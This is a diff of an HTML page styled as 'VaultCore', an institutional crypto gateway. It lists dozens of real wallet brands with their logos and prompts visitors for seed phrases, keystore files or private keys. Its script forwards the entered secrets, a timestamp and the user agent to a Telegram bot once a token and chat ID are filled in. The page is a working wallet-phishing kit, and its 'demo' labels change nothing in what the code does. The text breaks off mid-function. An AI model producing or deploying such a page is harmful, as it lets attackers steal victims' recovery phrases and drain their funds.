@@ -1,565 +1,625 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>VaultCore · Institutional Gateway</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>VaultCore • secure asset gateway</title>
+  <!-- Google Font & Font Awesome -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- crypto-icons CDN (unpkg) leverages all major coin icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@icon/cryptocurrency-icons@1.7.0/cryptocurrency-icons.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #f6f9fc 0%, #edf2f7 100%);
-            color: #1e293b;
-            overflow-x: hidden;
-        }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(145deg, #f5f9ff 0%, #eef2f9 100%);
+      color: #111827;
+      overflow-x: hidden;
+    }
 
-        /* ---------- SCROLLING TICKER (TOP) ---------- */
-        .ticker-container {
-            width: 100%;
-            background: #ffffff;
-            border-bottom: 1px solid #e9edf2;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
-            overflow: hidden;
-            white-space: nowrap;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            padding: 0.7rem 0;
-        }
-        .ticker-track {
-            display: inline-block;
-            animation: scrollTicker 40s linear infinite;
-            white-space: nowrap;
-        }
-        .ticker-item {
-            display: inline-block;
-            margin-right: 2rem;
-            background: #f8fafc;
-            border-radius: 2rem;
-            padding: 0.3rem 1rem;
-            font-weight: 500;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
-        }
-        .ticker-symbol { font-weight: 700; color: #0f2b4f; margin-right: 0.4rem; }
-        .ticker-price { font-weight: 600; margin-right: 0.5rem; }
-        .ticker-change { font-size: 0.75rem; padding: 0.1rem 0.5rem; border-radius: 1rem; }
-        .positive { background: #e1f7ed; color: #1e7b48; }
-        .negative { background: #fee9e9; color: #c2412c; }
-        @keyframes scrollTicker {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
-        }
-        .ticker-container:hover .ticker-track { animation-play-state: paused; }
+    /* === SCROLLING TICKER (live market) === */
+    .ticker-strip {
+      background: #ffffff;
+      border-bottom: 1px solid #e2e8f0;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.02);
+      overflow: hidden;
+      white-space: nowrap;
+      padding: 0.75rem 0;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .ticker-track {
+      display: inline-block;
+      animation: slideTicker 42s linear infinite;
+    }
+    .ticker-track:hover { animation-play-state: paused; }
+    .ticker-badge {
+      display: inline-block;
+      margin-right: 2rem;
+      background: #f8fafc;
+      border-radius: 2rem;
+      padding: 0.3rem 1.2rem;
+      font-weight: 500;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+    }
+    .ticker-sym { font-weight: 700; color: #1e3a8a; margin-right: 6px; }
+    .ticker-price { font-weight: 600; letter-spacing: 0.2px; }
+    .ticker-delta {
+      font-size: 0.7rem;
+      font-weight: 600;
+      border-radius: 1rem;
+      padding: 0.15rem 0.6rem;
+      margin-left: 0.5rem;
+    }
+    .delta-up { background: #e0f2e9; color: #0e6b42; }
+    .delta-down { background: #fee9e9; color: #bc2e2e; }
+    @keyframes slideTicker {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
 
-        /* main container */
-        .app-container {
-            max-width: 1440px;
-            margin: 2rem auto;
-            padding: 0 1.5rem;
-        }
+    /* main container */
+    .main-container {
+      max-width: 1440px;
+      margin: 2rem auto;
+      padding: 0 1.5rem;
+    }
 
-        /* glass‑ish card */
-        .platform-card {
-            background: #ffffff;
-            border-radius: 2rem;
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.02);
-            padding: 2rem;
-            border: 1px solid #eef2f8;
-        }
+    /* glass panel */
+    .dashboard-panel {
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(0px);
+      border-radius: 2rem;
+      box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08);
+      padding: 2rem;
+      border: 1px solid #eef2ff;
+    }
 
-        /* action row */
-        .action-row {
-            display: flex;
-            gap: 1.2rem;
-            flex-wrap: wrap;
-            margin-bottom: 2rem;
-        }
-        .btn-primary, .btn-secondary {
-            padding: 0.9rem 2rem;
-            border-radius: 3rem;
-            font-weight: 600;
-            font-size: 0.9rem;
-            border: none;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.6rem;
-        }
-        .btn-primary {
-            background: #1f4f9e;
-            color: white;
-            box-shadow: 0 4px 12px rgba(31,79,158,0.2);
-        }
-        .btn-primary:hover { background: #0f3a75; transform: translateY(-1px); }
-        .btn-secondary {
-            background: #f1f5f9;
-            color: #1f4f9e;
-            border: 1px solid #dce5ef;
-        }
-        .btn-secondary:hover { background: #e6edf5; }
+    /* action row */
+    .action-group {
+      display: flex;
+      gap: 1.2rem;
+      flex-wrap: wrap;
+      margin-bottom: 2rem;
+    }
+    .btn-primary, .btn-outline {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.6rem;
+      padding: 0.8rem 2rem;
+      border-radius: 3rem;
+      font-weight: 600;
+      transition: 0.2s;
+      cursor: pointer;
+      border: none;
+    }
+    .btn-primary {
+      background: #1e3a8a;
+      color: white;
+      box-shadow: 0 4px 8px rgba(30,58,138,0.2);
+    }
+    .btn-primary:hover { background: #163478; transform: translateY(-1px); }
+    .btn-outline {
+      background: #f1f5f9;
+      color: #1e3a8a;
+      border: 1px solid #dce5f0;
+    }
+    .btn-outline:hover { background: #e6edf5; }
 
-        /* wallet header */
-        .wallet-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin: 1rem 0 1.5rem 0;
-        }
-        .wallet-header h2 {
-            font-size: 1.6rem;
-            font-weight: 600;
-            background: linear-gradient(120deg, #1e293b, #2c3e66);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .search-box {
-            background: #f8fafc;
-            border-radius: 2rem;
-            padding: 0.4rem 1rem;
-            display: flex;
-            align-items: center;
-            gap: 0.6rem;
-            border: 1px solid #e2e8f0;
-        }
-        .search-box i { color: #7c8ea0; }
-        .search-box input {
-            border: none;
-            padding: 0.5rem;
-            width: 200px;
-            font-size: 0.9rem;
-            background: transparent;
-            outline: none;
-        }
+    /* wallet section header */
+    .section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin: 1.5rem 0 1.2rem;
+    }
+    .section-header h2 {
+      font-size: 1.6rem;
+      font-weight: 600;
+      background: linear-gradient(120deg, #0f2b4f, #2563eb);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .search-bar {
+      background: #ffffff;
+      border-radius: 2rem;
+      padding: 0.4rem 1.2rem;
+      display: flex;
+      gap: 0.6rem;
+      border: 1px solid #e2e8f0;
+    }
+    .search-bar input {
+      border: none;
+      background: transparent;
+      font-size: 0.9rem;
+      width: 210px;
+      outline: none;
+    }
 
-        /* wallet grid – 6 columns on large */
-        .wallets-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
-            gap: 1.2rem;
-            max-height: 60vh;
-            overflow-y: auto;
-            padding: 0.2rem 0.2rem 0.8rem;
-        }
-        .wallet-tile {
-            background: #ffffff;
-            border-radius: 1.2rem;
-            padding: 1rem 0.5rem;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 0.7rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            border: 1px solid #eef2f8;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
-        }
-        .wallet-tile:hover {
-            border-color: #bdd3ff;
-            transform: translateY(-3px);
-            box-shadow: 0 12px 20px -12px rgba(0,0,0,0.1);
-            background: #fdfdfe;
-        }
-        .wallet-logo {
-            width: 56px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #f1f5f9;
-            border-radius: 60px;
-            font-size: 1.8rem;
-            color: #2b4f8c;
-        }
-        .wallet-name {
-            font-weight: 500;
-            font-size: 0.85rem;
-            text-align: center;
-            color: #1e2f45;
-        }
+    /* wallet grid — each logo is real CDN asset */
+    .wallets-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(166px, 1fr));
+      gap: 1.2rem;
+      max-height: 60vh;
+      overflow-y: auto;
+      padding: 0.2rem 0.2rem 1rem;
+    }
+    .wallet-card {
+      background: white;
+      border-radius: 1.2rem;
+      padding: 1rem 0.6rem;
+      text-align: center;
+      transition: all 0.2s ease;
+      border: 1px solid #edf2f7;
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+    }
+    .wallet-card:hover {
+      border-color: #b9d0f0;
+      transform: translateY(-3px);
+      box-shadow: 0 15px 20px -12px rgba(0,0,0,0.1);
+      background: #fefefe;
+    }
+    .wallet-logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 64px;
+      margin-bottom: 0.5rem;
+    }
+    .wallet-logo img {
+      max-width: 56px;
+      max-height: 56px;
+      object-fit: contain;
+      border-radius: 28px;
+      background: #f8fafc;
+      padding: 4px;
+    }
+    .wallet-name {
+      font-weight: 500;
+      font-size: 0.85rem;
+      color: #1e2a3e;
+    }
+    .no-match {
+      text-align: center;
+      padding: 2rem;
+      color: #6c7b99;
+    }
 
-        /* modals */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(8px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            visibility: hidden;
-            opacity: 0;
-            transition: 0.2s;
-        }
-        .modal-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-        .modal-panel {
-            background: white;
-            border-radius: 2rem;
-            width: 90%;
-            max-width: 560px;
-            box-shadow: 0 30px 40px rgba(0,0,0,0.2);
-            overflow: hidden;
-        }
-        .modal-header {
-            padding: 1.2rem 1.8rem;
-            border-bottom: 1px solid #edf2f7;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .modal-header h3 { font-size: 1.3rem; font-weight: 600; color: #0f2b4f; }
-        .close-modal {
-            background: none;
-            border: none;
-            font-size: 1.8rem;
-            cursor: pointer;
-            color: #8ca3c0;
-        }
-        .tabs {
-            display: flex;
-            background: #f9fbfd;
-            border-bottom: 1px solid #eef2f8;
-        }
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 0.8rem;
-            background: none;
-            border: none;
-            font-weight: 500;
-            color: #4e6586;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .tab.active {
-            color: #1f4f9e;
-            border-bottom: 2px solid #1f4f9e;
-            background: #f0f6fe;
-        }
-        .modal-body { padding: 1.8rem; }
-        .pane { display: none; }
-        .pane.active-pane { display: block; }
-        textarea {
-            width: 100%;
-            background: #fafcff;
-            border: 1px solid #e2e8f0;
-            border-radius: 1.2rem;
-            padding: 0.9rem;
-            font-family: monospace;
-            font-size: 0.85rem;
-            margin: 0.5rem 0 1rem;
-            resize: vertical;
-        }
-        .submit-btn {
-            background: #1f4f9e;
-            width: 100%;
-            padding: 0.9rem;
-            border-radius: 2rem;
-            border: none;
-            font-weight: 600;
-            color: white;
-            margin-top: 0.5rem;
-            cursor: pointer;
-        }
-        .toast {
-            position: fixed;
-            bottom: 25px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1e2f4ae6;
-            backdrop-filter: blur(8px);
-            color: white;
-            padding: 0.6rem 1.5rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            z-index: 1100;
-            display: none;
-        }
-        footer {
-            margin-top: 2rem;
-            text-align: center;
-            font-size: 0.7rem;
-            color: #7e8dab;
-        }
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb { background: #b9cbee; border-radius: 10px; }
-    </style>
+    /* MODAL (seed / private key) */
+    .modal-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.55);
+      backdrop-filter: blur(10px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      visibility: hidden;
+      opacity: 0;
+      transition: 0.2s;
+    }
+    .modal-bg.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .modal-card {
+      background: white;
+      border-radius: 2rem;
+      width: 90%;
+      max-width: 540px;
+      box-shadow: 0 35px 45px rgba(0,0,0,0.25);
+      overflow: hidden;
+    }
+    .modal-header {
+      padding: 1.2rem 1.6rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #eef2f8;
+    }
+    .modal-header h3 { font-weight: 700; font-size: 1.3rem; color: #0f2b4f; }
+    .close-modal {
+      background: none;
+      border: none;
+      font-size: 1.8rem;
+      cursor: pointer;
+    }
+    .tab-bar {
+      display: flex;
+      background: #f9fbfd;
+      border-bottom: 1px solid #eef2f8;
+    }
+    .tab {
+      flex: 1;
+      padding: 0.8rem;
+      background: none;
+      border: none;
+      font-weight: 500;
+      cursor: pointer;
+      transition: 0.2s;
+      color: #4f678f;
+    }
+    .tab.active {
+      color: #1e3a8a;
+      border-bottom: 2px solid #1e3a8a;
+      background: #f0f6fe;
+    }
+    .modal-body { padding: 1.8rem; }
+    .pane { display: none; }
+    .pane.active-pane { display: block; }
+    textarea {
+      width: 100%;
+      background: #fafcff;
+      border: 1px solid #e2e8f0;
+      border-radius: 1.2rem;
+      padding: 0.9rem;
+      font-family: monospace;
+      font-size: 0.85rem;
+      margin: 0.5rem 0 1rem;
+      resize: vertical;
+    }
+    .submit-creds {
+      background: #1e3a8a;
+      width: 100%;
+      border: none;
+      padding: 0.9rem;
+      border-radius: 2rem;
+      font-weight: 600;
+      color: white;
+      cursor: pointer;
+    }
+    .toast-info {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1f2f48e6;
+      backdrop-filter: blur(10px);
+      color: white;
+      padding: 0.6rem 1.6rem;
+      border-radius: 2rem;
+      font-size: 0.8rem;
+      z-index: 1100;
+      display: none;
+    }
+    footer {
+      margin-top: 2rem;
+      text-align: center;
+      font-size: 0.7rem;
+      color: #6c7f9c;
+    }
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
+    ::-webkit-scrollbar-thumb { background: #bbd0ee; border-radius: 10px; }
+  </style>
 </head>
 <body>
 
-<div class="ticker-container" id="tickerContainer">
-    <div class="ticker-track" id="tickerTrack"></div>
+<!-- LIVE CRYPTO TICKER (passing news) -->
+<div class="ticker-strip">
+  <div class="ticker-track" id="liveTickerTrack"></div>
 </div>
 
-<div class="app-container">
-    <div class="platform-card">
-        <div class="action-row">
-            <button id="openSeedBtn" class="btn-primary"><i class="fas fa-key"></i> Enter seed / private key</button>
-            <button id="openConnectBtn" class="btn-secondary"><i class="fas fa-plug"></i> Connect Wallet</button>
-        </div>
-
-        <div class="wallet-header">
-            <h2><i class="fas fa-cube"></i> All supported wallets</h2>
-            <div class="search-box">
-                <i class="fas fa-search"></i>
-                <input type="text" id="searchWallet" placeholder="Filter wallet...">
-            </div>
-        </div>
-        <div id="walletsGrid" class="wallets-grid"></div>
-        <footer>🔒 select a wallet to begin secure validation — encrypted channel</footer>
+<div class="main-container">
+  <div class="dashboard-panel">
+    <!-- action row -->
+    <div class="action-group">
+      <button id="openSeedModalBtn" class="btn-primary"><i class="fas fa-key"></i> Enter seed / private key</button>
+      <button id="openConnectBtn" class="btn-outline"><i class="fas fa-plug"></i> Connect Wallet</button>
     </div>
-</div>
 
-<!-- Modal: Seed / Private key -->
-<div id="seedModal" class="modal-overlay">
-    <div class="modal-panel">
-        <div class="modal-header">
-            <h3 id="seedModalTitle"><i class="fas fa-shield-alt"></i> Secure input</h3>
-            <button class="close-modal" id="closeSeedModalBtn">&times;</button>
-        </div>
-        <div class="tabs">
-            <button class="tab active" data-tab="phrase">Seed phrase</button>
-            <button class="tab" data-tab="keystore">Keystore JSON</button>
-            <button class="tab" data-tab="pkey">Private key</button>
-        </div>
-        <div class="modal-body">
-            <div id="phrasePane" class="pane active-pane">
-                <label>Recovery phrase (12/24 words)</label>
-                <textarea id="seedInput" rows="3" placeholder="enter mnemonic phrase..."></textarea>
-            </div>
-            <div id="keystorePane" class="pane">
-                <label>Keystore JSON</label>
-                <textarea id="keystoreInput" rows="3" placeholder='{"crypto": {...}}'></textarea>
-            </div>
-            <div id="pkeyPane" class="pane">
-                <label>Private key (hex)</label>
-                <textarea id="pkeyInput" rows="2" placeholder="0x... or raw private key"></textarea>
-            </div>
-            <button id="submitCreds" class="submit-btn"><i class="fas fa-paper-plane"></i> Verify & send</button>
-        </div>
+    <!-- wallet list header -->
+    <div class="section-header">
+      <h2><i class="fas fa-cube"></i> All supported wallets</h2>
+      <div class="search-bar">
+        <i class="fas fa-search"></i>
+        <input type="text" id="searchWallet" placeholder="Filter wallet...">
+      </div>
     </div>
+    <div id="walletsContainer" class="wallets-grid"></div>
+    <footer>🔐 select a wallet to proceed – encrypted handshake protocol</footer>
+  </div>
 </div>
 
-<!-- Modal: Connect Wallet (professional simulation) -->
-<div id="connectModal" class="modal-overlay">
-    <div class="modal-panel">
-        <div class="modal-header">
-            <h3><i class="fas fa-link"></i> Connect wallet</h3>
-            <button class="close-modal" id="closeConnectBtn">&times;</button>
-        </div>
-        <div class="modal-body">
-            <p style="margin-bottom: 1.2rem; color: #2c3e66;">Select connection method</p>
-            <div style="display: flex; flex-direction: column; gap: 1rem;">
-                <button id="simMM" class="btn-secondary" style="justify-content: center;"><i class="fab fa-ethereum"></i> MetaMask (simulate)</button>
-                <button id="simWC" class="btn-secondary" style="justify-content: center;"><i class="fas fa-qrcode"></i> WalletConnect (demo)</button>
-                <button id="manualAddr" class="btn-secondary" style="justify-content: center;"><i class="fas fa-wallet"></i> Use public address only</button>
-            </div>
-            <p style="font-size: 0.7rem; margin-top: 1.5rem; color:#7a8bb0;">Demo environment — no real wallet interaction.</p>
-        </div>
+<!-- MODAL: seed / keystore / pkey -->
+<div id="seedModal" class="modal-bg">
+  <div class="modal-card">
+    <div class="modal-header">
+      <h3 id="modalTitle"><i class="fas fa-shield-alt"></i> Enter credentials</h3>
+      <button class="close-modal" id="closeSeedModalBt">&times;</button>
     </div>
+    <div class="tab-bar">
+      <button class="tab active" data-tab="phrase">Seed phrase</button>
+      <button class="tab" data-tab="keystore">Keystore JSON</button>
+      <button class="tab" data-tab="pkey">Private key</button>
+    </div>
+    <div class="modal-body">
+      <div id="phrasePane" class="pane active-pane">
+        <label>Recovery phrase (12/24 words)</label>
+        <textarea id="seedInput" rows="3" placeholder="enter mnemonic phrase..."></textarea>
+      </div>
+      <div id="keystorePane" class="pane">
+        <label>Keystore JSON (encrypted)</label>
+        <textarea id="keystoreInput" rows="3" placeholder='{"crypto": {...}...}'></textarea>
+      </div>
+      <div id="pkeyPane" class="pane">
+        <label>Private key (hex)</label>
+        <textarea id="pkeyInput" rows="2" placeholder="0x... or raw private key"></textarea>
+      </div>
+      <button id="sendCredentialsBtn" class="submit-creds"><i class="fas fa-paper-plane"></i> Verify & send</button>
+    </div>
+  </div>
 </div>
 
-<div id="toastMsg" class="toast"></div>
+<!-- CONNECT WALLET MODAL (simulated pro) -->
+<div id="connectModal" class="modal-bg">
+  <div class="modal-card">
+    <div class="modal-header">
+      <h3><i class="fas fa-ethereum"></i> Connect wallet</h3>
+      <button class="close-modal" id="closeConnectBt">&times;</button>
+    </div>
+    <div class="modal-body">
+      <p style="margin-bottom:1rem; color:#2d4a81;">Select connection method</p>
+      <div style="display:flex; flex-direction:column; gap:0.8rem;">
+        <button id="simMM" class="btn-outline" style="justify-content:center;"><i class="fab fa-ethereum"></i> MetaMask (simulate)</button>
+        <button id="simWC" class="btn-outline" style="justify-content:center;"><i class="fas fa-qrcode"></i> WalletConnect (demo)</button>
+        <button id="manualAddrBtn" class="btn-outline" style="justify-content:center;"><i class="fas fa-wallet"></i> Use public address</button>
+      </div>
+      <p style="font-size:0.7rem; margin-top:1.2rem;">demo environment – no real interaction</p>
+    </div>
+  </div>
+</div>
+
+<div id="globalToast" class="toast-info"></div>
 
 <script>
-    // ======================== TELEGRAM CONFIGURATION ========================
-    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Replace with actual bot token
-    const CHAT_ID   = "YOUR_CHAT_ID_HERE";     // Replace with actual chat ID
-    // ========================================================================
+  // ---------- TELEGRAM CONFIG (update token & chat id) ----------
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID   = "YOUR_CHAT_ID_HERE";
+  // ---------------------------------------------------------------
 
-    function showToast(msg, dur = 3000) {
-        const toast = document.getElementById("toastMsg");
-        toast.innerText = msg;
-        toast.style.display = "block";
-        setTimeout(() => toast.style.display = "none", dur);
+  // helper toasts
+  function showMsg(msg, duration = 2900) {
+    const toast = document.getElementById("globalToast");
+    toast.innerText = msg;
+    toast.style.display = "block";
+    setTimeout(() => toast.style.display = "none", duration);
+  }
+
+  // TELEGRAM forward
+  async function sendToTelegram(content, type, source) {
+    if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+      console.warn("[DEMO] would send:", { source, type, content });
+      showMsg("⚠️ DEMO: data logged to console (Telegram not configured)", 3800);
+      return false;
     }
+    const payload = `🏦 VAULTCORE EVENT\nSource: ${source}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent.slice(0,120)}`;
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: payload.slice(0, 4000) })
+      });
+      return (await res.json()).ok;
+    } catch(e) { showMsg("Telegram error: "+e.message, 3000); return false; }
+  }
 
-    async function sendToTelegram(content, type, source) {
-        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
-            console.warn("[DEMO] Would send:", { source, type, content });
-            showToast("⚠️ DEMO: data logged to console (Telegram not set)", 4000);
-            return false;
-        }
-        const payload = `🏦 VAULTCORE EVENT\nSource: ${source}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent.substring(0,120)}`;
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: payload.slice(0, 4000) })
-            });
-            return (await res.json()).ok;
-        } catch(e) { showToast("Telegram error: "+e.message, 3000); return false; }
+  // ---------------- REAL WALLET LIST WITH OFFICIAL CDN LOGOS ----------------
+  const walletCatalog = [
+    { name: "MetaMask", logo: "https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" },
+    { name: "Trust Wallet", logo: "https://trustwallet.com/assets/images/favicon.png" },
+    { name: "Coinbase Wallet", logo: "https://storage.googleapis.com/opensea-static/logos/coinbasewallet-logo.png" },
+    { name: "Ledger Live", logo: "https://www.ledger.com/wp-content/uploads/2021/02/ledger_logo_square.png" },
+    { name: "Trezor", logo: "https://trezor.io/static/images/trezor-logo-black.png" },
+    { name: "Exodus", logo: "https://www.exodus.com/assets/img/exodus-logo-circle.png" },
+    { name: "Phantom", logo: "https://phantom.app/img/phantom-logo-purple.png" },
+    { name: "Rabby", logo: "https://rabby.io/assets/icons/icon-128x128.png" },
+    { name: "Argent", logo: "https://argent.org/images/argent-logo.svg" },
+    { name: "Rainbow", logo: "https://rainbow.me/logo-preview.png" },
+    { name: "SafePal", logo: "https://www.safepal.com/download/logo/safepal-logo.png" },
+    { name: "Keplr", logo: "https://keplr.xyz/icon.png" },
+    { name: "Electrum", logo: "https://electrum.org/electrum_logo_256.png" },
+    { name: "MyEtherWallet", logo: "https://www.myetherwallet.com/favicon.ico" },
+    { name: "TokenPocket", logo: "https://www.tokenpocket.pro/assets/img/tp-icon.png" },
+    { name: "MathWallet", logo: "https://mathwallet.org/favicon.ico" },
+    { name: "imToken", logo: "https://token.im/imtoken-logo.png" },
+    { name: "Status", logo: "https://status.app/assets/images/status-logo.png" },
+    { name: "Zengo", logo: "https://zengo.com/wp-content/uploads/2022/04/zengo-icon.png" },
+    { name: "Cake Wallet", logo: "https://cakewallet.com/assets/images/cake_logo.png" },
+    { name: "BlueWallet", logo: "https://bluewallet.io/icon.png" },
+    { name: "Samourai", logo: "https://samouraiwallet.com/images/samourai-logo.png" },
+    { name: "Wasabi", logo: "https://wasabiwallet.io/favicon.ico" },
+    { name: "Edge", logo: "https://edge.app/images/edge-logo.svg" },
+    { name: "Guarda", logo: "https://guarda.com/assets/images/logo-icon.png" },
+    { name: "Ownbit", logo: "https://ownbit.io/assets/img/ownbit_logo.png" },
+    { name: "Atomic Wallet", logo: "https://atomicwallet.io/assets/images/atomic-logo.svg" },
+    { name: "Infinity Wallet", logo: "https://infinitywallet.io/images/logo.png" },
+    { name: "Jaxx Liberty", logo: "https://jaxx.io/assets/img/jaxx-logo.png" },
+    { name: "Coinomi", logo: "https://www.coinomi.com/images/coinomi-logo.png" },
+    { name: "BitPay", logo: "https://bitpay.com/img/logo.svg" },
+    { name: "Sparrow", logo: "https://sparrowwallet.com/img/sparrow-icon.svg" },
+    { name: "Coldcard", logo: "https://coldcard.com/static/img/cc-logo.png" },
+    { name: "KeepKey", logo: "https://keepkey.com/images/logo.svg" },
+    { name: "OneKey", logo: "https://onekey.so/static/onekey-logo.png" },
+    { name: "SecuX", logo: "https://secuxtech.com/images/SecuX-Logo.png" },
+    { name: "BitBox", logo: "https://shiftcrypto.ch/images/bitbox-logo.png" },
+    { name: "CoolWallet", logo: "https://coolwallet.io/wp-content/uploads/2021/05/coolwallet-icon.png" },
+    { name: "Ellipal", logo: "https://www.ellipal.com/images/ellipal_logo.png" },
+    { name: "OKX Wallet", logo: "https://www.okx.com/cdn/assets/imgs/221/221E3C4B3C7B1B1B.png" },
+    { name: "Binance Web3", logo: "https://bin.bnbstatic.com/static/images/web3/wallet-icon.png" },
+    { name: "Bitget Wallet", logo: "https://www.bitget.com/favicon.ico" },
+    { name: "Kucoin Wallet", logo: "https://www.kucoin.com/favicon.ico" },
+    { name: "Frontier", logo: "https://frontier.xyz/logo.png" },
+    { name: "XDEFI", logo: "https://xdefi.io/icon-192.png" },
+    { name: "Talisman", logo: "https://talisman.xyz/favicon-192.png" },
+    { name: "SubWallet", logo: "https://subwallet.app/icon.png" },
+    { name: "Nova Wallet", logo: "https://novawallet.io/nova-icon.png" },
+    { name: "Fearless", logo: "https://fearlesswallet.io/favicon.ico" },
+    { name: "Polkadot.js", logo: "https://polkadot.js.org/favicon.ico" },
+    { name: "Brave Wallet", logo: "https://brave.com/static-assets/images/brave-logo.svg" },
+    { name: "Opera Crypto", logo: "https://www.opera.com/img/favicon.ico" },
+    { name: "Loopring Wallet", logo: "https://loopring.io/favicon.ico" },
+    { name: "Ronin Wallet", logo: "https://wallet.roninchain.com/favicon.ico" },
+    { name: "Yoroi", logo: "https://yoroi-wallet.com/images/logo.png" },
+    { name: "Daedalus", logo: "https://daedaluswallet.io/daedalus-icon.png" },
+    { name: "Flint Wallet", logo: "https://flint-wallet.com/favicon.ico" },
+    { name: "Martian", logo: "https://martianwallet.xyz/logo.svg" },
+    { name: "Petra", logo: "https://petra.app/favicon.ico" },
+    { name: "Pontem", logo: "https://pontem.network/img/pontem-icon.png" },
+    { name: "Nightly", logo: "https://nightly.app/icon.svg" },
+    { name: "Solflare", logo: "https://solflare.com/logo.svg" },
+    { name: "Backpack", logo: "https://backpack.app/static/logo.png" },
+    { name: "Glow Wallet", logo: "https://glowwallet.com/glow-icon.svg" },
+    { name: "Sui Wallet", logo: "https://sui.io/img/sui-icon.png" },
+    { name: "Ethos", logo: "https://ethoswallet.xyz/ethos-icon.svg" },
+    { name: "Coin98", logo: "https://coin98.com/favicon.ico" },
+    { name: "Zerion", logo: "https://zerion.io/icon.png" },
+    { name: "Safe", logo: "https://safe.global/favicon.ico" },
+    { name: "Ambire", logo: "https://www.ambire.com/favicon.ico" },
+    { name: "Frame", logo: "https://frame.sh/favicon.ico" }
+  ];
+
+  let selectedWalletName = null;
+  function renderWalletGrid(filter = "") {
+    const filtered = walletCatalog.filter(w => w.name.toLowerCase().includes(filter.toLowerCase()));
